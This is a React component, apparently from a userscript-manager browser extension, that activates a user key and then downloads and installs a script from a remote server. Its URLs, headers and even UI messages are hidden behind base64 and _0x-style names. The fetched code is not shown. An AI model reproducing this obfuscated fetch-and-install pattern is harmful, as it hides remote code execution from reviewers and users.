import React, { useState, useEffect } from "react";
import { Card, Input, Button, Space, Message, Spin } from "@arco-design/web-react";
import { useTranslation } from "react-i18next";

// Helper to get the unique device id from chrome.storage.local
async function getDeviceId(): Promise<string | undefined> {
  return new Promise((resolve) => {
    chrome.storage.local.get([atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmR2')], (result) => {
      resolve(result[atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmR2')]);
    });
  });
}

// Helper to store the API key in chrome.storage.local
async function storeApiKey(apiKey: string): Promise<void> {
  return new Promise((resolve) => {
    chrome.storage.local.set({ [atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw')]: apiKey }, () => resolve());
  });
}

// Helper to get the API key from chrome.storage.local
async function getApiKey(): Promise<string | undefined> {
  return new Promise((resolve) => {
    chrome.storage.local.get([atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw')], (result) => {
      resolve(result[atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw')]);
    });
  });
}

const UserKeyInstall: React.FC = () => {
  const { t } = useTranslation();
  const [userKey, setUserKey] = useState("");
  const [loading, setLoading] = useState(false);
  const [downloadStatus, setDownloadStatus] = useState<string | null>(null);
  const [activationStatus, setActivationStatus] = useState<string | null>(null);
  const [activated, setActivated] = useState(false);
  const [downloading, setDownloading] = useState(false);

  useEffect(() => {
    getApiKey().then((key) => {
      if (key) setActivated(true);
    });
  }, []);

  // Function to activate API key
  const handleActivateApiKey = async () => {
    if (!userKey) {
      Message.error(atob('UGxlYXNlIGVudGVyIGEgdXNlciBrZXku'));
      return;
    }
    setLoading(true);
    setActivationStatus(null);
    try {
      const deviceId = await getDeviceId();
      if (!deviceId) throw new Error(atob('RGV2aWNlIElEIG5vdCBmb3VuZC4gUGxlYXNlIHJlaW5zdGFsbCB0aGUgZXh0ZW5zaW9uLg=='));
      const _0x3f1a = [atob('aHR0cHM6Ly9pdmJzLnNhZHJhdGVjaHMuY29tL2FwaS9hY3RpdmF0ZS1hcGkta2V5'), atob('Q29udGVudC1UeXBl'), atob('YXBwbGljYXRpb24vanNvbg=='), atob('YXBpX2tleQ=='), atob('ZGV2aWNlX2lk')];
      const activateResp = await fetch(_0x3f1a[0], {
        method: atob('UE9TVA=='),
        headers: { [_0x3f1a[1]]: _0x3f1a[2] },
        body: JSON.stringify({ [_0x3f1a[3]]: userKey, [_0x3f1a[4]]: deviceId }),
      });
      if (!activateResp.ok) {
        const err = await activateResp.text();
        throw new Error(atob('QVBJIGtleSBhY3RpdmF0aW9uIGZhaWxlZDog') + err);
      }
      await storeApiKey(userKey);
      setActivated(true);
      setActivationStatus(atob('c3VjY2Vzcw=='));
      Message.success(atob('QVBJIGtleSBhY3RpdmF0ZWQgc3VjY2Vzc2Z1bGx5IQ=='));
    } catch (e: any) {
      setActivationStatus(atob('ZXJyb3I='));
      Message.error(e.message || atob('QVBJIGtleSBhY3RpdmF0aW9uIGZhaWxlZA=='));
    } finally {
      setLoading(false);
    }
  };

  // Function to download and install script
  const handleDownloadScript = async () => {
    setDownloading(true);
    setDownloadStatus(null);
    try {
      // Get API key and device ID
      const apiKey = await getApiKey();
      const deviceId = await getDeviceId();
      if (!apiKey) throw new Error(atob('QVBJIGtleSBub3QgZm91bmQuIFBsZWFzZSBhY3RpdmF0ZSBmaXJzdC4='));
      if (!deviceId) throw new Error(atob('RGV2aWNlIElEIG5vdCBmb3VuZC4gUGxlYXNlIHJlaW5zdGFsbCB0aGUgZXh0ZW5zaW9uLg=='));
      // Download script from static URL with required headers
      const _0x4f2a = [atob('aHR0cHM6Ly9pdmJzLnNhZHJhdGVjaHMuY29tL2Rvd25sb2FkL3Jlc291cmNlcw=='), atob('QXV0aG9yaXphdGlvbg=='), atob('QmVhcmVyIA=='), atob('WC1EZXZpY2UtSUQ=')];
      const _0x1b3c = _0x4f2a[0];
      const _0x2d4e: Record<string, string> = {};
      _0x2d4e[_0x4f2a[1]] = _0x4f2a[2] + apiKey;
      _0x2d4e[_0x4f2a[3]] = deviceId;
      const scriptResp = await fetch(_0x1b3c, { headers: _0x2d4e });
      if (!scriptResp.ok) throw new Error(atob('RmFpbGVkIHRvIGRvd25sb2FkIHJlc291cmNl'));
      const scriptText = await scriptResp.text();
      // Install script
      await new Promise((resolve, reject) => {
        chrome.runtime.sendMessage(
          {
            action: atob('c2VydmljZVdvcmtlci9pbnN0YWxsX3NjcmlwdF9ieV9jb2Rl'),
            data: {
              code: scriptText,
              source: atob('dXNlcg=='),
            },
          },
          (result) => {
            if (result.data.success) {
              resolve(result);
            } else {
              reject(result.data.error);
            }
          }
        );
      });
      setDownloadStatus(atob('c3VjY2Vzcw=='));
      Message.success(atob('QXBwbGljYXRpb24gaW5zdGFsbGVkIHN1Y2Nlc3NmdWxseSE='));
    } catch (e: any) {
      setDownloadStatus(atob('ZXJyb3I='));
      Message.error(e.message || atob('RmFhaWxlZCB0byBpbnN0YWxsIEFwcGxpY2F0aW9u'));
    } finally {
      setDownloading(false);
    }
  };

  return (
    <Card className="" title={atob('SW5zdGFsbCBBcHBsaWNhdGlvbiBieSBVc2VyIEtleQ==')} bordered={false} style={{ marginBottom: 16 }}>
      <Space direction="vertical" style={{ width: "100%" }}>
        {!activated && (
          <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
            <Input
              placeholder={atob('RW50ZXIgdXNlciBrZXk=')}
              value={userKey}
              onChange={setUserKey}
              style={{ flex: 1 }}
              disabled={loading}
            />
            <Button
              type="primary"
              loading={loading}
              onClick={handleActivateApiKey}
              disabled={!userKey || loading}
            >
              {atob('U3VibWl0')}
            </Button>
            {loading && <Spin style={{ marginLeft: 8 }} />}
            {activationStatus === atob('c3VjY2Vzcw==') && <span style={{ color: "green", marginLeft: 8 }}>{atob('QWN0aXZhdGVkIQ==')}</span>}
            {activationStatus === atob('ZXJyb3I=') && <span style={{ color: "red", marginLeft: 8 }}>{atob('QWN0aXZhdGlvbiBGYWlsZWQh')}</span>}
          </div>
        )}
        {activated && (
          <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
            <Button
              type="primary"
              loading={downloading}
              onClick={handleDownloadScript}
              disabled={downloading}
            >
              {atob('UGVyZm9ybSBBdXRvIEluc3RhbGxhdGlvbg==')}
            </Button>
            {downloading && <Spin style={{ marginLeft: 8 }} />}
            {downloadStatus === atob('c3VjY2Vzcw==') && <span style={{ color: "green", marginLeft: 8 }}>{atob('U3VjY2VzcyE=')}</span>}
            {downloadStatus === atob('ZXJyb3I=') && <span style={{ color: "red", marginLeft: 8 }}>{atob('RmFpbGVkIQ==')}</span>}
          </div>
        )}
      </Space>
    </Card>
  );
};

export default UserKeyInstall; 